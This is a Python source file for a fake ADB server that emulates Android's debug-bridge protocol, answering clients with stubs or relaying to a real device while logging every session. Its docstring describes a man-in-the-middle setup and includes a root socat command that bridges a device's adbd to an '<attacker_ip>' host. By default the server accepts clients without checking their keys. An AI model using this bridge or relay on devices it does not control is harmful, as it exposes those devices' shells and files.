#!/usr/bin/env python3
"""
fake_adb_server.py

Emulates an ADB server implementing the ADB Device Communication Protocol
(ADCP / ADB wire protocol). Captures and optionally proxies ADB sessions.

Protocol reference:
  https://android.googlesource.com/platform/packages/modules/adb/+/refs/heads/master/protocol.txt

Modes
─────
  standalone   Handles ADB wire protocol connections directly with stub
               service responses. All traffic captured. No device needed.

  proxy        Accepts connections, connects to real adbd on target device,
               relays bidirectionally while capturing the full session.

Connection scenarios
────────────────────
  A. Transparent MITM (adb client → us → real device):
       python3 fake_adb_server.py --bind 127.0.0.1 --port 5037 \\
                                  --device-ip <phone_ip> --device-port 5555
       adb -H 127.0.0.1 -P 5037 shell id

  B. Device connects to us via root socat bridge on device:
       # On device (root required):
       socat TCP:<attacker_ip>:5037 TCP:127.0.0.1:5555
       # Attacker:
       python3 fake_adb_server.py --bind 0.0.0.0 --port 5037

  C. Standard adb connect to our stub (standalone):
       python3 fake_adb_server.py --bind 0.0.0.0 --port 5555
       adb connect <attacker_ip>:5555

Usage
─────
  As script:
      python3 fake_adb_server.py [--bind 0.0.0.0] [--port 5037]
                                 [--device-ip IP] [--device-port 5555]
                                 [--log-dir ./captures] [-v]

  As library:
      from fake_adb_server import FakeADBServer, ServerConfig
      from pathlib import Path
      import threading

      cfg = ServerConfig(device_ip="192.168.1.x", log_dir=Path("./caps"))
      srv = FakeADBServer(cfg)
      threading.Thread(target=srv.start, daemon=True).start()
      ...
      srv.stop()
"""

import argparse
import logging
import os
import socket
import struct
import threading
import time
import zlib
from dataclasses import dataclass, field
from enum import IntEnum
from pathlib import Path
from typing import Dict, Optional, Tuple

__all__ = ["FakeADBServer", "ServerConfig"]

log = logging.getLogger(__name__)


# ══════════════════════════════════════════════════════════════════════════════
#  ADB wire protocol constants
# ══════════════════════════════════════════════════════════════════════════════

class Cmd(IntEnum):
    SYNC = 0x434e5953
    CNXN = 0x4e584e43
    AUTH = 0x48545541
    OPEN = 0x4e45504f
    OKAY = 0x59414b4f
    CLSE = 0x45534c43
    WRTE = 0x45545257

class AuthType(IntEnum):
    TOKEN        = 1
    SIGNATURE    = 2
    RSAPUBLICKEY = 3

ADB_VERSION  = 0x01000000
ADB_MAX_DATA = 256 * 1024   # max payload bytes per message

_HFMT  = "<IIIIII"           # cmd arg0 arg1 data_len crc32 magic (little-endian)
_HSIZE = struct.calcsize(_HFMT)  # 24 bytes


# ══════════════════════════════════════════════════════════════════════════════
#  Configuration
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ServerConfig:
    bind_host:       str           = "0.0.0.0"
    bind_port:       int           = 5037
    device_ip:       Optional[str] = None   # set to enable proxy mode
    device_port:     int           = 5555
    log_dir:         Path          = field(default_factory=lambda: Path("./adb_captures"))
    accept_all_auth: bool          = True   # bypass RSA signature verification
    # If True: probe whether peer sends CNXN first (device-initiated) or
    # expects us to (client-initiated). If False: always send CNXN first.
    negotiate_cnxn:  bool          = True
    negotiate_timeout: float       = 0.8    # seconds to wait for peer-initiated CNXN
    # Banner we present to connecting peers (host side)
    server_banner:   str           = (
        "host::features=shell_v2,cmd,stat_v2,ls_v2,"
        "fixed_push_mkdir,apex,abb,abb_exec,"
        "remount_shell,sendrecv_v2"
    )

    def __post_init__(self):
        self.log_dir = Path(self.log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)


# ══════════════════════════════════════════════════════════════════════════════
#  Wire format
# ══════════════════════════════════════════════════════════════════════════════

class ADBMessage:
    """
    24-byte fixed header followed by optional data payload.

    Header layout (all u32 LE):
        command     — one of Cmd.*
        arg0        — command-specific (local_id, auth type, ADB version)
        arg1        — command-specific (remote_id, max data, 0)
        data_length — byte length of payload
        data_crc32  — crc32 of payload
        magic       — command ^ 0xFFFFFFFF  (integrity check)
    """
    __slots__ = ("command", "arg0", "arg1", "data")

    def __init__(self, cmd: int, arg0: int, arg1: int, data: bytes = b""):
        self.command = cmd
        self.arg0    = arg0
        self.arg1    = arg1
        self.data    = data

    # ── I/O ────────────────────────────────────────────────────────────────── #

    def pack(self) -> bytes:
        crc   = zlib.crc32(self.data) & 0xFFFFFFFF
        magic = self.command ^ 0xFFFFFFFF
        hdr   = struct.pack(_HFMT,
                    self.command, self.arg0, self.arg1,
                    len(self.data), crc, magic)
        return hdr + self.data

    @classmethod
    def recv(cls, sock: socket.socket) -> "ADBMessage":
        """Block until a complete message arrives on sock."""
        hdr = _recvn(sock, _HSIZE)
        cmd, arg0, arg1, dlen, _crc, magic = struct.unpack(_HFMT, hdr)
        if (cmd ^ magic) & 0xFFFFFFFF != 0xFFFFFFFF:
            raise ValueError(
                f"ADB magic check failed: cmd={cmd:#010x} magic={magic:#010x}")
        data = _recvn(sock, dlen) if dlen else b""
        return cls(cmd, arg0, arg1, data)

    # ── helpers ────────────────────────────────────────────────────────────── #

    @property
    def name(self) -> str:
        try:
            return Cmd(self.command).name
        except ValueError:
            return f"UNK({self.command:#010x})"

    def __repr__(self) -> str:
        return (f"ADBMsg({self.name} "
                f"a0={self.arg0:#010x} a1={self.arg1:#010x} "
                f"dlen={len(self.data)})")


def _recvn(sock: socket.socket, n: int) -> bytes:
    """Read exactly n bytes, raising ConnectionResetError on EOF."""
    buf, view = bytearray(n), None
    view  = memoryview(buf)
    total = 0
    while total < n:
        got = sock.recv_into(view[total:], n - total)
        if not got:
            raise ConnectionResetError(
                f"Socket EOF: expected {n} bytes, got {total}")
        total += got
    return bytes(buf)


# ══════════════════════════════════════════════════════════════════════════════
#  Session logger
# ══════════════════════════════════════════════════════════════════════════════

class SessionLog:
    """
    Per-session structured capture file.
    Thread-safe; flushed immediately after every write.
    """

    def __init__(self, path: Path, peer: str):
        self._fh   = path.open("w", encoding="utf-8", buffering=1)
        self._lock = threading.Lock()
        self._emit(
            f"# ADB capture  peer={peer}  "
            f"ts={time.strftime('%Y-%m-%dT%H:%M:%S')}\n\n")

    def msg(self, direction: str, m: ADBMessage):
        lines = [
            f"[{_ts()}] {direction:<12} {m.name:<5}  "
            f"a0={m.arg0:#010x}  a1={m.arg1:#010x}  dlen={len(m.data)}"
        ]
        # Decode service strings and banners
        if m.name in ("OPEN", "CNXN") and m.data:
            lines.append(
                f"             text={m.data.rstrip(b'\\x00').decode(errors='replace')!r}")
        # Hex dump data (skip for CNXN banners and AUTH tokens to keep logs clean)
        if m.data and m.name not in ("CNXN", "AUTH"):
            lines.append(_hexdump(m.data, indent=13))
        self._emit("\n".join(lines) + "\n\n")

    def event(self, note: str):
        self._emit(f"[{_ts()}] ## {note}\n\n")

    def raw(self, tag: str, data: bytes):
        self._emit(
            f"[{_ts()}] {tag:<12} {len(data)}b\n"
            f"{_hexdump(data, indent=13)}\n\n")

    def close(self):
        with self._lock:
            try:
                self._fh.close()
            except OSError:
                pass

    def _emit(self, s: str):
        with self._lock:
            self._fh.write(s)


def _ts() -> str:
    return time.strftime("%H:%M:%S")


def _hexdump(data: bytes, indent: int = 0, w: int = 16) -> str:
    sp, rows = " " * indent, []
    for i in range(0, len(data), w):
        b = data[i:i + w]
        rows.append(
            f"{sp}{i:08x}  "
            f"{' '.join(f'{x:02x}' for x in b):<{w * 3}}  "
            f"|{''.join(chr(x) if 0x20 <= x < 0x7F else '.' for x in b)}|"
        )
    return "\n".join(rows) if rows else f"{sp}(empty)"


# ══════════════════════════════════════════════════════════════════════════════
#  Stream types
#
#  ADB multiplexes multiple logical streams over one TCP connection.
#  Each OPEN creates a stream with a (local_id, remote_id) pair.
#
#  ID semantics (from our server's perspective):
#    local_id   — ID we assigned to this stream; goes in our arg0
#    remote_id  — ID the peer assigned; goes in our arg1
#
#  Client WRTE/OKAY/CLSE:
#    arg0 = client's local_id  (their side)
#    arg1 = our local_id       (they reference our ID)
#  → dispatch by arg1 (our local_id)
# ══════════════════════════════════════════════════════════════════════════════

class Stream:
    """Base stream toward the connecting peer (client side)."""

    def __init__(self, local_id: int, remote_id: int,
                 sock: socket.socket, slog: SessionLog):
        self.local_id  = local_id    # our server-side ID
        self.remote_id = remote_id   # peer's ID
        self._sock     = sock
        self._log      = slog
        self.closed    = False

    # ── outbound helpers ───────────────────────────────────────────────────── #

    def _send(self, m: ADBMessage):
        self._log.msg("  TX→client", m)
        self._sock.sendall(m.pack())

    def okay(self):
        self._send(ADBMessage(Cmd.OKAY, self.local_id, self.remote_id))

    def write(self, data: bytes):
        self._send(ADBMessage(Cmd.WRTE, self.local_id, self.remote_id, data))

    def close_stream(self):
        self._send(ADBMessage(Cmd.CLSE, self.local_id, self.remote_id))
        self.closed = True

    # ── inbound callbacks (overridden by subclasses) ───────────────────────── #

    def on_write(self, data: bytes): ...
    def on_okay(self): ...
    def on_close(self): self.closed = True


class StubShellStream(Stream):
    """
    Intercepts shell: services in standalone mode.
    Logs stdin, emits a canned response, then closes the stream.
    """

    def __init__(self, svc: str, *a, **kw):
        super().__init__(*a, **kw)
        self._svc = svc
        self._log.event(f"SHELL stream: {svc!r}")

    def on_write(self, data: bytes):
        self._log.raw("  STDIN", data)
        self.okay()
        self.write(
            f"# [fake-adb] intercepted shell: {self._svc}\n"
            f"# session logged\n".encode())
        self.close_stream()


class StubSyncStream(Stream):
    """Intercepts sync: (file push/pull) services in standalone mode."""

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self._log.event("SYNC stream opened")

    def on_write(self, data: bytes):
        self._log.raw("  SYNC_IN", data)
        self.okay()


class ProxyStream(Stream):
    """
    Transparent relay: client ←→ ProxyStream ←→ real adbd.

    Maintains two (local_id, remote_id) pairs:
      • client side: inherited from Stream (local_id / remote_id)
      • device side: _dev_lid / _dev_rid

    _dev_rid is 0 until the device confirms the OPEN with OKAY.
    """

    def __init__(self, dev_lid: int, dev_sock: socket.socket, *a, **kw):
        super().__init__(*a, **kw)
        self._dev_lid  = dev_lid   # our local_id on the device transport
        self._dev_rid  = 0         # device's local_id; set on first device OKAY
        self._dev_sock = dev_sock

    def _send_dev(self, m: ADBMessage):
        self._log.msg("  TX→device", m)
        self._dev_sock.sendall(m.pack())

    # ── client → device ────────────────────────────────────────────────────── #

    def on_write(self, data: bytes):
        self._log.raw("  C→D", data)
        self.okay()   # ACK to client
        self._send_dev(ADBMessage(Cmd.WRTE, self._dev_lid, self._dev_rid, data))

    def on_okay(self):
        self._send_dev(ADBMessage(Cmd.OKAY, self._dev_lid, self._dev_rid))

    def on_close(self):
        self._send_dev(ADBMessage(Cmd.CLSE, self._dev_lid, self._dev_rid))
        self.closed = True

    # ── device → client (called from _dev_reader thread) ──────────────────── #

    def on_device_okay(self, dev_rid: int):
        """Device acknowledged our OPEN; store its local_id."""
        self._dev_rid = dev_rid
        self.okay()   # forward OKAY to client

    def on_device_write(self, data: bytes):
        self._log.raw("  D→C", data)
        self.write(data)
        # ACK to device
        self._send_dev(ADBMessage(Cmd.OKAY, self._dev_lid, self._dev_rid))

    def on_device_close(self):
        self.close_stream()
        self.closed = True


# ══════════════════════════════════════════════════════════════════════════════
#  ADB Session
# ══════════════════════════════════════════════════════════════════════════════

class ADBSession:
    """
    One complete ADB connection lifecycle.

    Stream tables (protected by _stream_lock):
      _by_clid  int → Stream       route client WRTE/OKAY/CLSE by our local_id
      _by_dlid  int → ProxyStream  route device messages by our dev_lid

    Threading model:
      • Client reader loop runs on the calling thread.
      • Device reader loop runs in a daemon thread (_dev_reader).
      • Both threads share _by_clid/_by_dlid under _stream_lock.
    """

    def __init__(self, client: socket.socket, addr: Tuple[str, int],
                 cfg: ServerConfig, dev: Optional[socket.socket]):
        self._client      = client
        self._dev         = dev
        self._cfg         = cfg
        self._stop        = threading.Event()

        self._by_clid: Dict[int, Stream]      = {}
        self._by_dlid: Dict[int, ProxyStream] = {}
        self._stream_lock = threading.Lock()

        self._lid      = 0
        self._lid_lock = threading.Lock()

        fname = f"ses_{addr[0]}_{addr[1]}_{int(time.time())}.txt"
        self._log = SessionLog(cfg.log_dir / fname, f"{addr[0]}:{addr[1]}")
        log.info("Session %s:%d  →  %s", addr[0], addr[1], cfg.log_dir / fname)

    # ── public entry point ─────────────────────────────────────────────────── #

    def run(self):
        try:
            if not self._handshake_client():
                return
            if self._dev and not self._handshake_device():
                return
            if self._dev:
                threading.Thread(
                    target=self._dev_reader, daemon=True,
                    name=f"DevRd-{id(self)}").start()
            self._client_loop()
        except Exception as e:
            self._log.event(f"Session error: {type(e).__name__}: {e}")
        finally:
            self._stop.set()
            self._log.event("Session closed")
            self._log.close()
            for s in (self._client, self._dev):
                if s:
                    try:
                        s.close()
                    except OSError:
                        pass

    # ── handshakes ─────────────────────────────────────────────────────────── #

    def _banner(self) -> ADBMessage:
        return ADBMessage(Cmd.CNXN, ADB_VERSION, ADB_MAX_DATA,
                          (self._cfg.server_banner + "\x00").encode())

    def _send_client(self, m: ADBMessage):
        self._log.msg("TX→client", m)
        self._client.sendall(m.pack())

    def _handshake_client(self) -> bool:
        """
        Negotiate CNXN with the connecting peer.

        Two sub-cases:
          peer-initiated  device's adbd connected to us via socat bridge;
                          adbd sends CNXN immediately after we accept.
          host-initiated  adb client connected expecting us to announce first.

        With negotiate_cnxn=True we probe with a short timeout to
        distinguish the two before committing to a direction.
        """
        if self._cfg.negotiate_cnxn:
            self._client.settimeout(self._cfg.negotiate_timeout)
            try:
                first = ADBMessage.recv(self._client)
                self._client.settimeout(None)
                self._log.msg("RX←peer", first)

                if first.command == Cmd.CNXN:
                    # Peer sent first — device-initiated
                    self._log.event(
                        f"Peer-initiated CNXN: "
                        f"{first.data.decode(errors='replace').strip()}")
                    self._send_client(self._banner())
                    return True

                if first.command == Cmd.AUTH:
                    return self._absorb_client_auth(first)

                self._log.event(f"Unexpected first message: {first.name}")
                return False

            except (socket.timeout, BlockingIOError):
                # Nothing received — we go first
                self._client.settimeout(None)

        # Host-initiated: send our CNXN, wait for theirs
        self._send_client(self._banner())
        return self._await_client_cnxn()

    def _await_client_cnxn(self) -> bool:
        """Read client messages until we get CNXN or exhaust retries."""
        for _ in range(6):
            try:
                m = ADBMessage.recv(self._client)
            except OSError as e:
                self._log.event(f"Client read: {e}")
                return False
            self._log.msg("RX←client", m)

            if m.command == Cmd.CNXN:
                self._log.event(
                    f"Client CNXN: {m.data.decode(errors='replace').strip()}")
                return True
            if m.command == Cmd.AUTH:
                if self._absorb_client_auth(m):
                    return True
                # AUTH TOKEN was issued; loop to receive the reply
            else:
                self._log.event(f"Unexpected during handshake: {m.name}")
        return False

    def _absorb_client_auth(self, m: ADBMessage) -> bool:
        """
        Handle one AUTH message from the client.
        Returns True if the handshake is complete (CNXN sent).
        Returns False if we issued an AUTH TOKEN and need more rounds.
        """
        if m.arg0 == AuthType.RSAPUBLICKEY:
            self._log.event(f"AUTH RSAPUBLICKEY received ({len(m.data)}b)")
            if self._cfg.accept_all_auth:
                self._send_client(self._banner())
                return True
        elif m.arg0 == AuthType.SIGNATURE:
            self._log.event(f"AUTH SIGNATURE received ({len(m.data)}b)")
            if self._cfg.accept_all_auth:
                self._send_client(self._banner())
                return True

        # Issue a challenge token and let the loop continue
        token = os.urandom(20)
        self._send_client(ADBMessage(Cmd.AUTH, AuthType.TOKEN, 0, token))
        return False

    def _handshake_device(self) -> bool:
        """
        Perform the ADB wire handshake with the real device's adbd.

        adbd sends CNXN first (it's the TCP server on port 5555).
        We respond with our host CNXN, handle optional AUTH TOKEN.
        """
        try:
            first = ADBMessage.recv(self._dev)
        except OSError as e:
            self._log.event(f"Device read: {e}")
            return False
        self._log.msg("RX←device", first)

        if first.command != Cmd.CNXN:
            self._log.event(f"Expected device CNXN, got {first.name}")
            return False
        self._log.event(
            f"Device CNXN: {first.data.decode(errors='replace').strip()}")

        # Announce ourselves as a host
        host_banner = (
            "host::features=shell_v2,cmd,stat_v2,ls_v2,"
            "fixed_push_mkdir,apex,abb,abb_exec,"
            "remount_shell,sendrecv_v2\x00"
        ).encode()
        hm = ADBMessage(Cmd.CNXN, ADB_VERSION, ADB_MAX_DATA, host_banner)
        self._log.msg("TX→device", hm)
        self._dev.sendall(hm.pack())

        # Device may issue AUTH TOKEN if our key isn't pre-authorized
        try:
            reply = ADBMessage.recv(self._dev)
        except OSError as e:
            self._log.event(f"Post-device-CNXN read: {e}")
            return False
        self._log.msg("RX←device", reply)

        if reply.command == Cmd.AUTH and reply.arg0 == AuthType.TOKEN:
            self._log.event("Device AUTH TOKEN — sending RSA public key")
            try:
                pub = (Path.home() / ".android" / "adbkey.pub").read_bytes()
                self._log.event(f"Loaded ~/.android/adbkey.pub ({len(pub)}b)")
            except FileNotFoundError:
                self._log.event("~/.android/adbkey.pub not found — device may reject us")
                pub = b"placeholder_key\x00"

            auth = ADBMessage(Cmd.AUTH, AuthType.RSAPUBLICKEY, 0, pub)
            self._log.msg("TX→device", auth)
            self._dev.sendall(auth.pack())

            try:
                reply = ADBMessage.recv(self._dev)
                self._log.msg("RX←device", reply)
            except OSError as e:
                self._log.event(f"Post-AUTH device read: {e}")
                return False

        if reply.command != Cmd.CNXN:
            self._log.event(f"Device handshake failed: expected CNXN, got {reply.name}")
            return False

        self._log.event("Device handshake complete")
        return True

    # ── client message loop ─────────────────────────────────────────────────── #

    def _client_loop(self):
        while not self._stop.is_set():
            try:
                m = ADBMessage.recv(self._client)
            except (ConnectionResetError, OSError) as e:
                self._log.event(f"Client EOF/error: {e}")
                break
            self._log.msg("RX←client", m)

            if   m.command == Cmd.OPEN: self._on_open(m)
            elif m.command == Cmd.WRTE: self._on_wrte(m)
            elif m.command == Cmd.OKAY: self._on_okay(m)
            elif m.command == Cmd.CLSE: self._on_clse(m)
            else: self._log.event(f"Unhandled client message: {m.name}")

    def _on_open(self, m: ADBMessage):
        """
        OPEN(arg0=client_lid, arg1=0, data=service_string\0)

        Allocate a server-side local_id, create the appropriate stream,
        register it, then OKAY back to confirm the stream is open.
        """
        remote_id = m.arg0   # client's local_id for this stream
        svc       = m.data.rstrip(b"\x00").decode(errors="replace")
        lid       = self._next_lid()
        self._log.event(f"OPEN  svc={svc!r}  lid={lid}  rid={remote_id}")

        if self._dev:
            # Proxy mode: forward OPEN to the real device
            dlid = self._next_lid()
            fwd  = ADBMessage(Cmd.OPEN, dlid, 0, m.data)
            self._log.msg("TX→device", fwd)
            self._dev.sendall(fwd.pack())
            stream = ProxyStream(dlid, self._dev,
                                 lid, remote_id, self._client, self._log)
            with self._stream_lock:
                self._by_dlid[dlid] = stream
        elif svc.startswith("shell:"):
            stream = StubShellStream(svc, lid, remote_id, self._client, self._log)
        elif svc == "sync:":
            stream = StubSyncStream(lid, remote_id, self._client, self._log)
        else:
            self._log.event(f"Unsupported service {svc!r} — CLSE")
            self._client.sendall(
                ADBMessage(Cmd.CLSE, lid, remote_id).pack())
            return

        with self._stream_lock:
            self._by_clid[lid] = stream

        # Acknowledge OPEN to client
        self._send_client(ADBMessage(Cmd.OKAY, lid, remote_id))

    def _on_wrte(self, m: ADBMessage):
        # m.arg1 = our local_id (server side); m.arg0 = client's local_id
        with self._stream_lock:
            s = self._by_clid.get(m.arg1)
        if s:
            s.on_write(m.data)
        else:
            self._log.event(f"WRTE to unknown stream lid={m.arg1}")

    def _on_okay(self, m: ADBMessage):
        with self._stream_lock:
            s = self._by_clid.get(m.arg1)
        if s:
            s.on_okay()

    def _on_clse(self, m: ADBMessage):
        with self._stream_lock:
            s = self._by_clid.pop(m.arg1, None)
        if s:
            s.on_close()
            self._log.event(f"Stream lid={m.arg1} closed by client")

    # ── device reader thread ────────────────────────────────────────────────── #

    def _dev_reader(self):
        """
        Reads messages from the real adbd and routes them to the
        corresponding ProxyStream by dev_lid (our ID on the device transport).

        Device message arg semantics (from our perspective):
          OKAY(dev_local_id, our_dev_lid)  — device confirms OPEN
          WRTE(dev_local_id, our_dev_lid)  — device sends data
          CLSE(dev_local_id, our_dev_lid)  — device closes stream
        In all cases arg1 = our_dev_lid, which is the key into _by_dlid.
        """
        while not self._stop.is_set():
            try:
                m = ADBMessage.recv(self._dev)
            except (ConnectionResetError, OSError) as e:
                self._log.event(f"Device EOF/error: {e}")
                self._stop.set()
                break
            self._log.msg("RX←device", m)

            with self._stream_lock:
                proxy = self._by_dlid.get(m.arg1)

            if m.command == Cmd.OKAY:
                if proxy:
                    proxy.on_device_okay(m.arg0)   # m.arg0 = device's local_id
                else:
                    self._log.event(f"Device OKAY for unknown dlid={m.arg1}")

            elif m.command == Cmd.WRTE:
                if proxy:
                    proxy.on_device_write(m.data)
                else:
                    self._log.event(f"Device WRTE for unknown dlid={m.arg1}")

            elif m.command == Cmd.CLSE:
                with self._stream_lock:
                    proxy = self._by_dlid.pop(m.arg1, None)
                if proxy:
                    proxy.on_device_close()

            elif m.command == Cmd.CNXN:
                self._log.event("Unexpected CNXN from device mid-session")
            else:
                self._log.event(f"Unhandled device message: {m.name}")

    # ── util ───────────────────────────────────────────────────────────────── #

    def _next_lid(self) -> int:
        with self._lid_lock:
            self._lid += 1
            return self._lid


# ══════════════════════════════════════════════════════════════════════════════
#  Server
# ══════════════════════════════════════════════════════════════════════════════

class FakeADBServer:
    """
    TCP listener; one daemon thread per accepted connection.
    In proxy mode, each session independently connects to the real device.
    """

    def __init__(self, cfg: ServerConfig):
        self._cfg  = cfg
        self._stop = threading.Event()
        self._sock: Optional[socket.socket] = None

    def start(self):
        """Block, accepting connections until stop() is called."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._cfg.bind_host, self._cfg.bind_port))
        self._sock.listen(16)
        self._sock.settimeout(1.0)

        log.info(
            "Listening on %s:%d  captures→%s  mode=%s",
            self._cfg.bind_host, self._cfg.bind_port, self._cfg.log_dir,
            f"proxy→{self._cfg.device_ip}:{self._cfg.device_port}"
            if self._cfg.device_ip else "standalone")

        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
                conn.settimeout(None)
            except socket.timeout:
                continue
            except OSError:
                break
            log.info("Connection from %s:%d", *addr)
            threading.Thread(
                target=self._handle, args=(conn, addr),
                name=f"ADB-{addr[0]}:{addr[1]}", daemon=True
            ).start()

    def stop(self):
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def __enter__(self) -> "FakeADBServer":
        threading.Thread(target=self.start, daemon=True,
                         name="FakeADBServer").start()
        return self

    def __exit__(self, *_):
        self.stop()

    def _handle(self, client: socket.socket, addr: Tuple[str, int]):
        dev = None
        if self._cfg.device_ip:
            try:
                dev = socket.create_connection(
                    (self._cfg.device_ip, self._cfg.device_port), timeout=5.0)
                dev.settimeout(None)
                log.info("Device socket open for session %s:%d", *addr)
            except OSError as e:
                log.error("Device connect failed for %s:%d — %s", *addr, e)
        ADBSession(client, addr, self._cfg, dev).run()


# ══════════════════════════════════════════════════════════════════════════════
#  CLI entry point
# ══════════════════════════════════════════════════════════════════════════════

def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Fake ADB server — forensic ADB wire protocol interceptor",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--bind",          default="0.0.0.0",
                   help="Bind address")
    p.add_argument("--port",   "-p",  type=int, default=5037,
                   help="Listen port")
    p.add_argument("--device-ip",
                   help="Real device IP for proxy mode")
    p.add_argument("--device-port",   type=int, default=5555,
                   help="Real device adbd port")
    p.add_argument("--log-dir",       default="./adb_captures",
                   help="Directory for session capture files")
    p.add_argument("--no-negotiate",  action="store_true",
                   help="Always send CNXN first (disable auto-negotiation)")
    p.add_argument("--reject-auth",   action="store_true",
                   help="Do not bypass auth (challenge clients for real RSA key)")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Debug logging")
    return p.parse_args()


if __name__ == "__main__":
    args = _parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(threadName)s] %(levelname)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    cfg = ServerConfig(
        bind_host       = args.bind,
        bind_port       = args.port,
        device_ip       = args.device_ip,
        device_port     = args.device_port,
        log_dir         = Path(args.log_dir),
        accept_all_auth = not args.reject_auth,
        negotiate_cnxn  = not args.no_negotiate,
    )
    srv = FakeADBServer(cfg)
    try:
        srv.start()
    except KeyboardInterrupt:
        log.info("Interrupted — stopping.")
        srv.stop()
